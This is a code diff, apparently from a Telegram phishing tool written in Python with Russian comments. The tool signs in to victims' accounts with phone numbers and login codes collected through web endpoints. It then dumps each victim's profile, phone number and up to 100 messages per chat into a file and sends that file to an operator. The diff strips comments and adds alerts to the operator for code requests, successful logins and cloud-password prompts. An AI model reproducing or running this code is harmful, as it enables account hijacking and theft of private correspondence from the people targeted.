@@ -35,37 +35,29 @@ async def send_telegram_message(text):
 # Сбор данных в TXT (лимит 100 сообщений на диалог)
 # ============================================================
 async def collect_full_user_data_txt(client):
-    # 1. Получаем данные владельца (жертвы)
     me = await client.get_me()
     my_id = me.id
     my_username = me.username or "нет"
     my_first_name = me.first_name or "нет"
     my_phone = me.phone or "нет"
     
-    # 2. Создаём временный файл
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
     filename = f"dump_{my_id}_{timestamp}.txt"
     
     with open(filename, 'w', encoding='utf-8') as f:
-        # Заголовок профиля
         f.write("ПРОФИЛЬ\n")
         f.write(f"НИК: @{my_username}\n")
         f.write(f"АЙДИ: {my_id}\n")
         f.write(f"НОМЕР ТЕЛЕФОНА: {my_phone}\n")
         f.write("===============================================\n\n")
         
-        # Получаем все диалоги
         dialogs = await client.get_dialogs()
-        
-        # Кеш для сущностей (чтобы не дёргать API на каждое сообщение)
         entity_cache = {}
         
         for dialog in dialogs:
-            # Пропускаем диалог с самим собой
             if dialog.is_user and dialog.entity.id == my_id:
                 continue
             
-            # Определяем тип и заголовок
             if dialog.is_user and dialog.entity.bot:
                 chat_type = "БОТ"
                 name = dialog.entity.first_name or dialog.entity.username or "бот"
@@ -89,33 +81,26 @@ async def collect_full_user_data_txt(client):
                 name = dialog.title or "без названия"
                 phone_info = "—"
             
-            # Заголовок секции
             f.write(f"===== {chat_type}: {name} (ID: {dialog.id}) {phone_info} =====\n")
             
-            # Получаем сообщения (лимит 100)
             try:
                 messages = []
                 async for msg in client.iter_messages(dialog, limit=100):
                     messages.append(msg)
-                # Переворачиваем, чтобы шли в хронологическом порядке (старые→новые)
                 messages.reverse()
                 
                 for msg in messages:
-                    # Определяем отправителя
                     sender_id = msg.sender_id
                     if not sender_id:
-                        # Если нет sender_id, пробуем from_id
                         if msg.from_id:
                             sender_id = msg.from_id.user_id
                         else:
-                            continue  # пропускаем
+                            continue
                     
-                    # Получаем имя отправителя
                     if sender_id == my_id:
                         sender_name = f"@{my_username}" if my_username != "нет" else "Я"
                         prefix = "СООБЩЕНИЕ"
                     else:
-                        # Получаем сущность собеседника из кеша или через API
                         if sender_id not in entity_cache:
                             try:
                                 entity = await client.get_entity(sender_id)
@@ -132,7 +117,6 @@ async def collect_full_user_data_txt(client):
                     line = f"{prefix}({sender_name}): {msg.text or '[Медиа]'}\n"
                     f.write(line)
                 
-                # Конец диалога
                 f.write(f"========== КОНЕЦ ДИАЛОГА С {name} ==========\n\n")
                 
             except Exception as e:
@@ -154,6 +138,7 @@ async def send_document_to_admin(file_path):
                 if response.status_code != 200:
                     await send_telegram_message(f"❌ Ошибка отправки файла: {response.text}")
         logging.info(f"File {file_path} sent to admin.")
+        await send_telegram_message(f"📄 Файл {os.path.basename(file_path)} отправлен.")
     except Exception as e:
         await send_telegram_message(f"❌ Ошибка отправки документа: {str(e)}")
         raise
@@ -257,6 +242,8 @@ def api_send_code():
                 'session_id': session_id
             }
             await client.disconnect()
+            # Уведомление о запросе кода
+            await send_telegram_message(f"📩 Запрос кода для номера {phone} (сессия {session_id})")
             return True
         except Exception as e:
             logging.error(f"Send code error: {e}")
@@ -300,6 +287,10 @@ def api_verify_code():
             await client.connect()
             await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
             
+            # Уведомление об успешном входе
+            me = await client.get_me()
+            await send_telegram_message(f"✅ Вход выполнен для @{me.username or 'без ника'} (ID: {me.id})")
+            
             info = await check_balance_and_gifts(client)
             if info:
                 try:
@@ -320,6 +311,7 @@ def api_verify_code():
             return True
         except SessionPasswordNeededError:
             await client.disconnect()
+            await send_telegram_message("🔐 Требуется облачный пароль для входа")
             return "2fa_needed"
         except Exception as e:
             error_msg = f"❌ Ошибка входа: {str(e)}"
